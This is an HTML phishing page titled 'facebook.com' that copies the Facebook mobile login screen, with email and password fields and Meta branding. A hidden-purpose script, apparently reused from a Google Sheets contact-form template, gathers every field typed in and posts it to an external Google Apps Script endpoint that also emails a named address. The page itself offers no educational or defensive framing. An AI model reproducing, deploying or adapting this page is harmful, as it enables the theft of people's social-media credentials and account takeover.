<!doctype html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>facebook.com</title>
</head>
<body></body>
  <center>
    <form class="gform pure-form pure-form-stacked" method="POST" data-email="realflash97@gmail.com" action="https://script.google.com/macros/s/AKfycbwc3sMEUwc1KPzW9hNnqp_5wGlCopveXiiaYld2W43ops2N4quUgAzZUOyGg_nkttrL/exec">
      <div class="form-elements">
      </div><!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>facebook.com</title>
  <style>
    * {
      margin: 0;
      padding: 0;
    }
  .body{
    overflow: hidden;
    font-size: 17px;
    display: flex;
    padding: 15px;
    height: 30px;
  }
    .main {
      height: 200vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    
    .p1 {
      background: #E6E0C3;
      width: 100%;
      height: 25px;
      padding: 15px;
      font-size: 17px;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #091B63;
    }
    
    .logo {
      color: #2F4AB8;
      margin: 25px 0;
    }

    .form {
      margin-top: -5px;
      height: 40vh;
    }
    #email{
        width: 90vw;
      display: block;
      padding: 15px 10px;
      margin:  5px 0;
      outline: none;
      font-size: 18px;
      height: 28px;
      border-radius: 5px;
      border: none;
      background: #E9E9E9;
    }
    
    #pass{ 
      width: 90vw;
      display: block;
      padding: 15px 10px;
      margin: 5px 0;
      outline: none;
      font-size: 18px;
      height: 28px;
      border-radius: 5px;
      border: none;
      background: #E9E9E9;
    }

  
    #login {
      display: block;
      width: 95%;
      font-size: 17px;
      padding: 10px 0;
      margin: 10px 0;
      background: #3957CF;
      color: white;
      font-weight: bold;
      border-radius: 5px;
      border: none;
    }

    a {
      text-decoration: none;
      text-align: center;
      display: block;
      font-size: 14px;
      margin: 15px 0;
    }

    .or {
      display: flex;
      margin: 32px 0;
    }

    .p2,
    .p3 {
      background: black;
      height: 0.5px;
      width: 145px;
      margin: 0 10px;
    }

    .pOR {
      margin-top: -9px;
    }

    #CNA {
      background: none;
      border: .5px solid black;
      border-radius: 5px;
      padding: 8px 3px;
      width: 80vw;
      font-weight: bold;
      font-size: 16px;
      margin: -25px 25px;
    }
    .lang{
      display: flex;
      margin-top: 90px;
    }
    .lang span{
      margin: 0 65px;
      list-style: none;
      font-size: 13px;
    }
    .lang span li{
     margin: 3px 0;      
     color: #2E325E;
    }
    .lang span .bl{
      font-size: 14px;
      margin: 0 -8px;
      color: black; 
    }
   .footer{
     margin: 15px 22px;
    }
    .footer ul {
      display: flex;
    }
    .footer ul li{
      font-size: 10px;
    color: #8F9098;
     margin: 0 7px;
    }
    .no{
      list-style: none;
    }
    .meta{
      color: #8F9098;
      font-size: 13px;
      margin-top: -2px;
    } 

  </style>
</head>

<body>
  <div class="main">
    <p class="p1">📱Get Facebook for Android and browse faster.</p>

    <div class="logo">
      <h2>facebook</h2>
    </div>
    
    <form>
      <input placeholder="Mobile number or Email" type="email" name="email"
       id="email"
    <form>

      <input placeholder="Password" type="password" name="pass" id="pass">

      <button id="login" type="submit">Log in</button>
      <a href="forgotten password? ">Forgotten password? </a>

      <div class="or">
        
        <p class="p2"></p>
        <p class="pOR">or</p>
        <p class="p3"></p>
      </div>
      <button id="CNA" type="submit">Create new account</button>
    </form>

    <div class="lang">
      <span>
        <li class="bl">English (UK)</li>
        <li> portugeese</li>
        <li>Japanies</li>
        <li>Spanish</li>
      </span>

      <span>
        <li>Hindi</li>
        <li> Gujarati</li>
        <li>Telugu</li>
      </span>
    </div>

    <div class="footer">
      <ul>
        <li class="no">About</li>
        <li>Help </li>
        <li>More</li>
      </ul>
    </div>

    <p class="meta">Meta &copy; 2023</p>

  </div>

</body>

</html>
      <!-- Thankyou_message --><br>
      <div class="thankyou_message" style="display:none;background:none;border:8px solid gray;border-radius: 40px;width: 400px;padding-top: 15px;padding-bottom: 40px;padding-left: 20px;padding-right: 20px;"><br><br>
        <h1>Thanks for contacting us!</h1>
        <h1>*******</h1>
      </div>
    </form>
    <script data-cfasync="false" type="text/javascript">
      (function() {
        function validEmail(email) {
          var re = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i;
          return re.test(email);
        }

        function validateHuman(honeypot) {
          if (honeypot) {
            console.log("Robot Detected!");
            return true;
          } else {
            console.log("Welcome Human!");
          }
        }

        function getFormData(form) {
          var elements = form.elements;

          var fields = Object.keys(elements).filter(function(k) {
            return (elements[k].name !== "honeypot");
          }).map(function(k) {
            if (elements[k].name !== undefined) {
              return elements[k].name;
            } else if (elements[k].length > 0) {
              return elements[k].item(0).name;
            }
          }).filter(function(item, pos, self) {
            return self.indexOf(item) == pos && item;
          });

          var formData = {};
          fields.forEach(function(name) {
            var element = elements[name];
            formData[name] = element.value;
            if (element.length) {
              var data = [];
              for (var i = 0; i < element.length; i++) {
                var item = element.item(i);
                if (item.checked || item.selected) {
                  data.push(item.value);
                }
              }
              formData[name] = data.join(', ');
            }
          });

          // add form-specific values into the data
          formData.formDataNameOrder = JSON.stringify(fields);
          formData.formGoogleSheetName = form.dataset.sheet || "sheet1"; // default sheet name
          formData.formGoogleSendEmail = form.dataset.email || ""; // no email by default

          console.log(formData);
          return formData;
        }

        function handleFormSubmit(event) {
          event.preventDefault();
          var form = event.target;
          var data = getFormData(form);
          if (data.email && !validEmail(data.email)) {
            var invalidEmail = form.querySelector(".email-invalid");
            if (invalidEmail) {
              invalidEmail.style.display = "block";
              return false;
            }
          } else {
            disableAllButtons(form);
            var url = form.action;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', url);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
              console.log(xhr.status, xhr.statusText);
              console.log(xhr.responseText);
              var formElements = form.querySelector(".form-elements")
              if (formElements) {
                formElements.style.display = "none"; // hide form
              }
              var thankYouMessage = form.querySelector(".thankyou_message");
              if (thankYouMessage) {
                thankYouMessage.style.display = "block";
              }
              return;
            };
            var encoded = Object.keys(data).map(function(k) {
              return encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
            }).join('&');
            xhr.send(encoded);
          }
        }

        function loaded() {
          console.log("Contact form submission handler loaded successfully.");
          var forms = document.querySelectorAll("form.gform");
          for (var i = 0; i < forms.length; i++) {
            forms[i].addEventListener("submit", handleFormSubmit, false);
          }
        };
        document.addEventListener("DOMContentLoaded", loaded, false);

        function disableAllButtons(form) {
          var buttons = form.querySelectorAll("button");
          for (var i = 0; i < buttons.length; i++) {
            buttons[i].disabled = true;
          }
        }
      })();
    </script>
  </center>
</body>

</html>
